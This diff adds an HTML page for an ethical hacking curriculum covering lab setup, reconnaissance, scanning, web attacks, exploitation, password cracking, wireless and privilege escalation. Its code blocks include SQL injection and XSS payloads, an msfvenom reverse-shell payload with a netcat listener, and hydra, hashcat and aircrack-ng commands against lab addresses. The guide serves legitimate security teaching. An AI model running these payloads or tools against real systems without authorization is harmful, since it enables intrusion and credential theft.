@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HackEthically — Learn Ethical Hacking</title>
+<meta name="description" content="A free, structured curriculum for learning ethical hacking and penetration testing — legally and responsibly.">
+<link rel="icon" href="assets/favicon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+<header class="topbar">
+  <div class="brand">
+    <span class="prompt">$</span> HackEthically<span class="cursor">_</span>
+  </div>
+  <button class="nav-toggle" id="navToggle" aria-label="Toggle navigation">☰</button>
+  <nav class="quicklinks">
+    <a href="#ethics">Ethics</a>
+    <a href="#practice">Practice</a>
+    <a href="#certs">Certs</a>
+  </nav>
+</header>
+
+<div class="layout">
+  <aside class="sidebar" id="sidebar">
+    <div class="sidebar-title">Curriculum</div>
+    <nav id="toc">
+      <a href="#intro">0. Introduction</a>
+      <a href="#ethics" class="important">1. Rules &amp; Legality</a>
+      <a href="#what-is">2. What Is Ethical Hacking?</a>
+      <a href="#lab">3. Building Your Lab</a>
+      <a href="#fundamentals">4. Core Fundamentals</a>
+      <a href="#recon">5. Reconnaissance &amp; OSINT</a>
+      <a href="#scanning">6. Scanning &amp; Enumeration</a>
+      <a href="#vuln">7. Vulnerability Analysis</a>
+      <a href="#web">8. Web App Hacking</a>
+      <a href="#exploitation">9. Exploitation</a>
+      <a href="#passwords">10. Password Attacks</a>
+      <a href="#wireless">11. Wireless Security</a>
+      <a href="#privesc">12. Privilege Escalation</a>
+      <a href="#post">13. Post-Exploitation</a>
+      <a href="#social">14. Social Engineering</a>
+      <a href="#reporting">15. Reporting &amp; Disclosure</a>
+      <a href="#practice">16. Practice Platforms</a>
+      <a href="#certs">17. Certifications &amp; Careers</a>
+      <a href="#cheatsheet">18. Tool Cheat Sheet</a>
+    </nav>
+  </aside>
+
+  <main id="content">
+
+    <section id="intro" class="hero">
+      <h1>Learn Ethical Hacking — The Right Way</h1>
+      <p class="lede">
+        This is a self-paced curriculum for learning offensive security: how attackers
+        think, how systems break, and how to find and fix vulnerabilities before
+        criminals do. Every technique here is meant to be practiced <strong>only</strong>
+        on systems you own or are explicitly authorized to test.
+      </p>
+      <p class="lede small">
+        No signup, no tracking, no paywall. Just a map of what to learn and in what order.
+      </p>
+    </section>
+
+    <section id="ethics" class="module warning-module">
+      <h2>1. Rules &amp; Legality — Read This First</h2>
+      <div class="callout danger">
+        <strong>The single most important rule:</strong> Never test, scan, or attack any
+        system, network, or account unless you personally own it or have
+        <em>explicit, written authorization</em> from the owner. Everything past this
+        point assumes you are operating in a lab, a CTF, a bug bounty program's defined
+        scope, or a signed penetration-testing contract.
+      </div>
+      <ul>
+        <li><strong>Unauthorized access is a crime</strong> in most countries — e.g. the
+          Computer Fraud and Abuse Act (US), the Computer Misuse Act (UK), and equivalent
+          laws elsewhere — regardless of intent, even "just looking."</li>
+        <li><strong>Authorization must be explicit and in writing.</strong> A verbal
+          "sure, go ahead" is not a get-out-of-jail card. Professional engagements use a
+          signed <em>Rules of Engagement</em> document defining scope, dates, and allowed
+          techniques.</li>
+        <li><strong>Bug bounty programs</strong> (HackerOne, Bugcrowd, or a company's own
+          <code>/security.txt</code> policy) define exactly what's in scope — stay inside
+          those boundaries.</li>
+        <li><strong>Practice legally</strong> using the lab setups and platforms in
+          sections 3 and 16 — they exist precisely so you never have to touch a system
+          you don't have permission to touch.</li>
+        <li>When in doubt: <strong>don't.</strong> Ask the owner, or don't do it.</li>
+      </ul>
+    </section>
+
+    <section id="what-is" class="module">
+      <h2>2. What Is Ethical Hacking?</h2>
+      <p>
+        Ethical hacking (also called penetration testing or "pentesting") is the
+        practice of legally simulating attacks against systems to find weaknesses before
+        malicious actors do. The output isn't chaos — it's a report that helps an
+        organization fix its security.
+      </p>
+      <h3>The hats</h3>
+      <ul>
+        <li><strong>White hat</strong> — authorized security testing, the subject of this guide.</li>
+        <li><strong>Black hat</strong> — unauthorized, malicious hacking. Illegal.</li>
+        <li><strong>Grey hat</strong> — testing without authorization but without
+          malicious intent. Still illegal and strongly discouraged.</li>
+      </ul>
+      <h3>The typical engagement phases</h3>
+      <ol>
+        <li><strong>Scoping &amp; authorization</strong> — agree what's tested, when, and how.</li>
+        <li><strong>Reconnaissance</strong> — gather information (section 5).</li>
+        <li><strong>Scanning &amp; enumeration</strong> — map live hosts, ports, services (section 6).</li>
+        <li><strong>Vulnerability analysis</strong> — identify weaknesses (section 7).</li>
+        <li><strong>Exploitation</strong> — prove impact safely (section 9).</li>
+        <li><strong>Post-exploitation</strong> — assess blast radius (section 13).</li>
+        <li><strong>Reporting</strong> — the actual deliverable that creates value (section 15).</li>
+        <li><strong>Remediation retest</strong> — confirm fixes actually work.</li>
+      </ol>
+    </section>
+
+    <section id="lab" class="module">
+      <h2>3. Building Your Lab</h2>
+      <p>Everything you practice should happen in an isolated environment you control.</p>
+      <h3>3.1 Attacker machine</h3>
+      <ul>
+        <li>Install a hypervisor: <strong>VirtualBox</strong> (free) or <strong>VMware Workstation Player</strong>.</li>
+        <li>Download <strong>Kali Linux</strong> or <strong>Parrot OS</strong> — Linux
+          distributions pre-loaded with security tools.</li>
+        <li>Give the VM enough resources (4GB+ RAM, 2 CPU cores) and set its network
+          adapter to <strong>Host-Only</strong> or <strong>Internal Network</strong> so it
+          can't reach the real internet or your home network by accident.</li>
+      </ul>
+      <h3>3.2 Deliberately vulnerable targets</h3>
+      <ul>
+        <li><strong>Metasploitable 2/3</strong> — an intentionally vulnerable Linux VM for
+          practicing network and service exploitation.</li>
+        <li><strong>DVWA</strong> (Damn Vulnerable Web Application) &amp;
+          <strong>OWASP Juice Shop</strong> — vulnerable web apps for practicing web attacks.</li>
+        <li><strong>WebGoat</strong> — OWASP's guided vulnerable web app with lessons built in.</li>
+        <li><strong>VulnHub</strong> — hundreds of free downloadable vulnerable VMs, boot-to-root style.</li>
+      </ul>
+      <div class="callout tip">
+        <strong>Golden rule of lab networking:</strong> put attacker and target VMs on
+        the same isolated virtual network, with no bridge to your home Wi-Fi. This keeps
+        your practice contained and safe.
+      </div>
+      <pre><code># Example: quick Juice Shop target via Docker, isolated on its own network
+docker run --rm -p 3000:3000 bkimminich/juice-shop</code></pre>
+    </section>
+
+    <section id="fundamentals" class="module">
+      <h2>4. Core Fundamentals</h2>
+      <p>Attacks are built on fundamentals. Don't skip these.</p>
+      <h3>Networking</h3>
+      <ul>
+        <li>OSI / TCP-IP model, IP addressing, subnetting</li>
+        <li>TCP vs UDP, the three-way handshake</li>
+        <li>Common ports: 21 FTP, 22 SSH, 23 Telnet, 25 SMTP, 53 DNS, 80/443 HTTP(S),
+          445 SMB, 3389 RDP</li>
+        <li>DNS resolution, HTTP request/response structure</li>
+      </ul>
+      <h3>Linux command line</h3>
+      <pre><code>ls -la          # list files, including hidden
+cd /path        # change directory
+cat file.txt    # print file contents
+grep -r "pat" . # recursive search
+chmod +x file   # make executable
+ps aux          # running processes
+netstat -tulpn  # listening ports
+man command     # read the manual for any command</code></pre>
+      <h3>Scripting</h3>
+      <p>Learn enough <strong>Bash</strong> and <strong>Python</strong> to read and
+      modify existing exploit scripts and automate repetitive recon tasks.</p>
+    </section>
+
+    <section id="recon" class="module">
+      <h2>5. Reconnaissance &amp; OSINT</h2>
+      <p>Passive recon gathers information without touching the target directly.</p>
+      <ul>
+        <li><strong>WHOIS</strong> — domain registration info</li>
+        <li><strong>DNS enumeration</strong> — subdomains, mail servers, TXT records</li>
+        <li><strong>Google dorking</strong> — <code>site:example.com filetype:pdf</code>,
+          <code>intitle:"index of"</code></li>
+        <li><strong>Shodan / Censys</strong> — search engines for internet-connected devices</li>
+        <li><strong>theHarvester</strong> — emails, subdomains, names from public sources</li>
+        <li><strong>LinkedIn / social media</strong> — org structure for social engineering awareness</li>
+      </ul>
+      <pre><code>whois example.com
+dig example.com ANY
+theHarvester -d example.com -b google,bing
+amass enum -d example.com          # subdomain enumeration</code></pre>
+    </section>
+
+    <section id="scanning" class="module">
+      <h2>6. Scanning &amp; Enumeration</h2>
+      <p>Active recon: touching the target to map what's alive and listening.</p>
+      <pre><code># Host discovery
+nmap -sn 192.168.56.0/24
+
+# Fast port scan
+nmap -F 192.168.56.10
+
+# Full TCP scan with service/version detection
+nmap -p- -sV -sC -oN scan.txt 192.168.56.10
+
+# UDP scan (slower, often skipped, don't skip it)
+nmap -sU --top-ports 20 192.168.56.10</code></pre>
+      <ul>
+        <li><strong>nmap</strong> — the standard for host/port/service discovery.</li>
+        <li><strong>Enumeration by service:</strong> SMB (<code>enum4linux</code>,
+          <code>smbclient</code>), web (<code>gobuster</code>, <code>ffuf</code> for
+          directories/files), SNMP (<code>onesixtyone</code>).</li>
+      </ul>
+      <pre><code>gobuster dir -u http://192.168.56.10 -w /usr/share/wordlists/dirb/common.txt
+enum4linux -a 192.168.56.10</code></pre>
+    </section>
+
+    <section id="vuln" class="module">
+      <h2>7. Vulnerability Analysis</h2>
+      <p>Turn discovered services into a list of candidate weaknesses.</p>
+      <ul>
+        <li><strong>searchsploit</strong> — offline Exploit-DB search by service/version.</li>
+        <li><strong>Nessus / OpenVAS</strong> — automated vulnerability scanners for broad coverage.</li>
+        <li><strong>Nikto</strong> — quick web server misconfiguration/vuln scanner.</li>
+        <li>Cross-reference software versions against <strong>CVE</strong> databases (NVD, Vulners).</li>
+      </ul>
+      <pre><code>searchsploit apache 2.4.49
+nikto -h http://192.168.56.10</code></pre>
+      <div class="callout tip">Automated scanners find candidates, not proof. Always
+      validate manually before reporting a finding.</div>
+    </section>
+
+    <section id="web" class="module">
+      <h2>8. Web Application Hacking (OWASP Top 10)</h2>
+      <p>Most real-world engagements are web apps. Learn these deeply — practice each on
+      DVWA, Juice Shop, or <strong>PortSwigger Web Security Academy</strong> (free, excellent, legal labs).</p>
+
+      <h3>Injection (SQL Injection, Command Injection)</h3>
+      <pre><code>' OR '1'='1              -- classic auth bypass payload
+' UNION SELECT username, password FROM users --
+
+sqlmap -u "http://target/item?id=1" --dbs   # automated SQLi</code></pre>
+
+      <h3>Cross-Site Scripting (XSS)</h3>
+      <pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;</code></pre>
+
+      <h3>Other essentials</h3>
+      <ul>
+        <li><strong>Broken Access Control / IDOR</strong> — changing an ID in a URL/API
+          call to access another user's data (<code>/invoice?id=1002</code> →
+          <code>1003</code>).</li>
+        <li><strong>CSRF</strong> — tricking an authenticated user's browser into making
+          an unwanted request.</li>
+        <li><strong>SSRF</strong> — making the server fetch an attacker-chosen URL,
+          often reaching internal-only services.</li>
+        <li><strong>Security misconfiguration</strong> — default creds, verbose errors,
+          exposed admin panels.</li>
+        <li><strong>Insecure file upload</strong> — uploading a web shell disguised as
+          an image or bypassing extension checks.</li>
+        <li><strong>Authentication &amp; session flaws</strong> — weak password resets,
+          predictable tokens, missing rate limiting.</li>
+      </ul>
+      <h3>Core tool: Burp Suite</h3>
+      <p>Intercept and modify HTTP requests, automate fuzzing with Intruder, and map
+      applications with the Proxy/Spider. This is the daily driver for web pentesting.</p>
+    </section>
+
+    <section id="exploitation" class="module">
+      <h2>9. Exploitation</h2>
+      <p>Turning a vulnerability into proven, controlled impact — never further than the
+      engagement scope requires.</p>
+      <pre><code># Metasploit framework
+msfconsole
+search type:exploit platform:linux apache
+use exploit/multi/http/apache_something
+set RHOSTS 192.168.56.10
+set LHOST 192.168.56.5
+run
+
+# Generate a payload
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.5 LPORT=4444 -f elf > shell.elf
+
+# Catch the reverse shell
+nc -lvnp 4444</code></pre>
+      <ul>
+        <li><strong>Metasploit</strong> — framework of pre-built, modular exploits and payloads.</li>
+        <li><strong>Manual exploitation</strong> — modifying public PoC code from Exploit-DB/GitHub
+          to fit the target; understand what the code does before running it.</li>
+        <li><strong>Reverse vs. bind shells</strong> — reverse shells call back to you,
+          bypassing inbound firewall rules; bind shells listen on the target.</li>
+      </ul>
+    </section>
+
+    <section id="passwords" class="module">
+      <h2>10. Password Attacks</h2>
+      <ul>
+        <li><strong>Dictionary/wordlist attacks</strong> — try known common passwords (rockyou.txt).</li>
+        <li><strong>Brute force</strong> — try all combinations (slow, last resort).</li>
+        <li><strong>Credential stuffing</strong> — reuse breached credentials across services (scope-only).</li>
+        <li><strong>Hash cracking</strong> — recover plaintext from a stolen hash offline.</li>
+      </ul>
+      <pre><code># Online service brute force (only against authorized targets)
+hydra -l admin -P rockyou.txt ssh://192.168.56.10
+
+# Offline hash cracking
+hashcat -m 0 -a 0 hashes.txt rockyou.txt     # MD5 dictionary attack
+john --wordlist=rockyou.txt hashes.txt</code></pre>
+      <div class="callout tip">Always throttle/lockout-aware test online brute force —
+      it's noisy, easily detected, and can lock out real accounts in production.</div>
+    </section>
+
+    <section id="wireless" class="module">
+      <h2>11. Wireless Security</h2>
+      <ul>
+        <li><strong>Monitor mode</strong> — putting a wireless adapter into packet-capture mode.</li>
+        <li><strong>WPA/WPA2 handshake capture and offline cracking</strong> against your
+          own access point.</li>
+        <li>Awareness of <strong>evil twin / rogue AP</strong> attacks so you can recognize and defend against them.</li>
+      </ul>
+      <pre><code>airmon-ng start wlan0
+airodump-ng wlan0mon
+aireplay-ng --deauth 5 -a &lt;BSSID&gt; wlan0mon   # your own AP only
+aircrack-ng -w rockyou.txt -b &lt;BSSID&gt; capture.cap</code></pre>
+      <div class="callout danger">Only test wireless networks and access points you own.
+      Deauthenticating or cracking a neighbor's Wi-Fi is illegal.</div>
+    </section>
+
+    <section id="privesc" class="module">
+      <h2>12. Privilege Escalation</h2>
+      <p>Once you have low-privilege access, escalate to admin/root to show full impact.</p>
+      <ul>
+        <li><strong>Linux:</strong> misconfigured SUID binaries, writable cron jobs,
+          kernel exploits, weak sudo rules. Automate discovery with <code>linpeas.sh</code>.</li>
+        <li><strong>Windows:</strong> unquoted service paths, stored credentials,
+          weak service permissions, token impersonation. Automate with <code>winPEAS.exe</code>.</li>
+      </ul>
+      <pre><code>./linpeas.sh
+sudo -l                     # what can this user run as root?
+find / -perm -4000 2>/dev/null   # SUID binaries</code></pre>
+    </section>
+
+    <section id="post" class="module">
+      <h2>13. Post-Exploitation</h2>
+      <p>Demonstrate the real-world impact of a foothold, strictly within engagement scope.</p>
+      <ul>
+        <li><strong>Data discovery</strong> — what sensitive data is reachable from this position?</li>
+        <li><strong>Lateral movement / pivoting</strong> — using a compromised host to reach otherwise-unreachable network segments.</li>
+        <li><strong>Persistence</strong> — understand these mechanisms defensively; in a real
+          test, always clean up anything you add and document it in the report.</li>
+      </ul>
+    </section>
+
+    <section id="social" class="module">
+      <h2>14. Social Engineering</h2>
+      <p>Humans are frequently the weakest link. Understanding these attacks helps you
+      defend against them and, when explicitly authorized, test an organization's
+      awareness.</p>
+      <ul>
+        <li><strong>Phishing</strong> — deceptive emails/links designed to steal credentials or install malware.</li>
+        <li><strong>Pretexting</strong> — impersonating a trusted role (IT support, vendor) to extract information.</li>
+        <li><strong>Physical tailgating</strong> — following an employee through a badge-locked door.</li>
+      </ul>
+      <div class="callout danger">Social engineering engagements require unusually
+      explicit, written authorization naming exactly who/what may be targeted and how.
+      Never run phishing simulations against real people without that.</div>
+    </section>
+
+    <section id="reporting" class="module">
+      <h2>15. Reporting &amp; Responsible Disclosure</h2>
+      <p>The report is the actual product of a pentest — a finding that isn't
+      documented clearly didn't happen.</p>
+      <h3>A good finding includes</h3>
+      <ul>
+        <li>Title and severity (CVSS score)</li>
+        <li>Description of the vulnerability</li>
+        <li>Steps to reproduce (clear enough for a developer to replicate)</li>
+        <li>Evidence (screenshots, request/response, PoC code)</li>
+        <li>Business impact</li>
+        <li>Remediation recommendation</li>
+      </ul>
+      <h3>Responsible / coordinated disclosure</h3>
+      <p>If you find a vulnerability outside a formal engagement (e.g. in a product you
+      use), report it privately to the vendor first — check for a
+      <code>/.well-known/security.txt</code> file or a bug bounty program — and give
+      them reasonable time to fix it before any public discussion.</p>
+    </section>
+
+    <section id="practice" class="module">
+      <h2>16. Practice Platforms (Legal, Built for This)</h2>
+      <ul>
+        <li><strong>TryHackMe</strong> — guided, beginner-friendly rooms and learning paths.</li>
+        <li><strong>Hack The Box</strong> — realistic boot-to-root machines, ranges from easy to expert.</li>
+        <li><strong>PortSwigger Web Security Academy</strong> — free, deep, hands-on web vuln labs.</li>
+        <li><strong>OverTheWire</strong> — wargames for Linux/CLI fundamentals (Bandit is a great starting point).</li>
+        <li><strong>PicoCTF</strong> — beginner-friendly CTF challenges, great for students.</li>
+        <li><strong>VulnHub</strong> — downloadable vulnerable VMs for offline practice.</li>
+        <li><strong>HackerOne / Bugcrowd</strong> — real bug bounty programs once you're ready — always stay inside the published scope.</li>
+      </ul>
+    </section>
+
+    <section id="certs" class="module">
+      <h2>17. Certifications &amp; Careers</h2>
+      <ul>
+        <li><strong>CompTIA Security+</strong> — foundational security concepts, good starting point.</li>
+        <li><strong>eJPT (eLearnSecurity)</strong> — affordable, practical entry-level pentest cert.</li>
+        <li><strong>PenTest+ (CompTIA)</strong> — broader pentest methodology certification.</li>
+        <li><strong>OSCP (Offensive Security)</strong> — the industry-respected, hands-on
+          exam; widely considered a strong milestone.</li>
+        <li><strong>CEH (EC-Council)</strong> — widely recognized, more theory-heavy.</li>
+      </ul>
+      <p>Career paths: penetration tester, red teamer, security researcher, bug bounty
+      hunter, SOC analyst → detection engineer, application security engineer.</p>
+    </section>
+
+    <section id="cheatsheet" class="module">
+      <h2>18. Tool Cheat Sheet</h2>
+      <table class="cheatsheet-table">
+        <thead><tr><th>Tool</th><th>Purpose</th></tr></thead>
+        <tbody>
+          <tr><td>nmap</td><td>Network/port/service scanning</td></tr>
+          <tr><td>Burp Suite</td><td>Web app proxy/intercept/fuzz</td></tr>
+          <tr><td>Metasploit</td><td>Exploit framework</td></tr>
+          <tr><td>Wireshark</td><td>Packet capture/analysis</td></tr>
+          <tr><td>sqlmap</td><td>Automated SQL injection</td></tr>
+          <tr><td>gobuster / ffuf</td><td>Directory &amp; file fuzzing</td></tr>
+          <tr><td>hydra</td><td>Online login brute forcing</td></tr>
+          <tr><td>hashcat / John the Ripper</td><td>Offline hash cracking</td></tr>
+          <tr><td>aircrack-ng suite</td><td>Wireless auditing</td></tr>
+          <tr><td>Nikto</td><td>Web server vuln scan</td></tr>
+          <tr><td>theHarvester / Amass</td><td>OSINT &amp; subdomain enumeration</td></tr>
+          <tr><td>linpeas / winPEAS</td><td>Privilege escalation enumeration</td></tr>
+        </tbody>
+      </table>
+    </section>
+
+    <footer class="site-footer">
+      <p>Educational content only. Use this knowledge to secure systems and to test only
+      what you own or are explicitly authorized to test.</p>
+    </footer>
+
+  </main>
+</div>
+
+<script src="js/script.js"></script>
+</body>
+</html>
